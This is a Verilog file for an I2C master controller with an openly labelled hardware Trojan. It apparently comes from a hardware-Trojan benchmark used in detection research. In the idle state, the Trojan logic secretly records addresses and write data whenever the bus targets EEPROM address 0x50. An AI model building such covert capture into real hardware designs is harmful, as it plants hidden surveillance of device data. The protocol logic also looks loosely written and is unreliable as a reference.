// I2C-T100: I2C controller with address sniffing Trojan

module i2c_master_trojan(
    input clk,
    input rst,
    input [6:0] slave_addr,
    input [7:0] data_in,
    input start_xfer,
    input rw,
    output reg scl,
    output reg sda_out,
    input sda_in,
    output reg [7:0] data_out,
    output reg busy,
    output reg ack_error
);

    reg [3:0] state;
    reg [3:0] bit_cnt;
    reg [7:0] shift_reg;
    reg [15:0] clk_div;

    // Trojan: capture addresses and data
    reg [6:0] Trojan_addr_capture [0:15];
    reg [7:0] Trojan_data_capture [0:15];
    reg [3:0] capture_idx;
    wire trigger_capture = (slave_addr == 7'h50);  // EEPROM address

    parameter CLK_DIV = 16'd250;  // 100kHz I2C

    always @(posedge clk or posedge rst) begin
        if (rst) begin
            state <= 4'd0;
            bit_cnt <= 4'b0;
            shift_reg <= 8'b0;
            clk_div <= 16'b0;
            scl <= 1'b1;
            sda_out <= 1'b1;
            data_out <= 8'b0;
            busy <= 1'b0;
            ack_error <= 1'b0;
            capture_idx <= 4'b0;
        end else begin
            if (clk_div == CLK_DIV) begin
                clk_div <= 16'b0;
                scl <= ~scl;

                case (state)
                    4'd0: begin  // IDLE
                        if (start_xfer && !busy) begin
                            busy <= 1'b1;
                            state <= 4'd1;
                            shift_reg <= {slave_addr, rw};
                            bit_cnt <= 4'd8;
                            sda_out <= 1'b0;  // START

                            // Trojan: log access
                            if (trigger_capture) begin
                                Trojan_addr_capture[capture_idx] <= slave_addr;
                                Trojan_data_capture[capture_idx] <= data_in;
                                capture_idx <= capture_idx + 1;
                            end
                        end
                    end
                    4'd1: begin  // SEND ADDRESS
                        if (scl) begin
                            sda_out <= shift_reg[7];
                            shift_reg <= {shift_reg[6:0], 1'b1};
                            bit_cnt <= bit_cnt - 1;
                            if (bit_cnt == 0) state <= 4'd2;
                        end
                    end
                    4'd2: begin  // ACK
                        if (scl) begin
                            ack_error <= sda_in;
                            if (!rw) begin
                                state <= 4'd3;
                                shift_reg <= data_in;
                                bit_cnt <= 4'd8;
                            end else begin
                                state <= 4'd4;
                                bit_cnt <= 4'd8;
                            end
                        end
                    end
                    4'd3: begin  // WRITE DATA
                        if (scl) begin
                            sda_out <= shift_reg[7];
                            shift_reg <= {shift_reg[6:0], 1'b1};
                            bit_cnt <= bit_cnt - 1;
                            if (bit_cnt == 0) state <= 4'd5;
                        end
                    end
                    4'd4: begin  // READ DATA
                        if (scl) begin
                            shift_reg <= {shift_reg[6:0], sda_in};
                            bit_cnt <= bit_cnt - 1;
                            if (bit_cnt == 0) begin
                                data_out <= shift_reg;
                                state <= 4'd5;
                            end
                        end
                    end
                    4'd5: begin  // STOP
                        sda_out <= 1'b1;
                        busy <= 1'b0;
                        state <= 4'd0;
                    end
                endcase
            end else begin
                clk_div <= clk_div + 1;
            end
        end
    end

endmodule
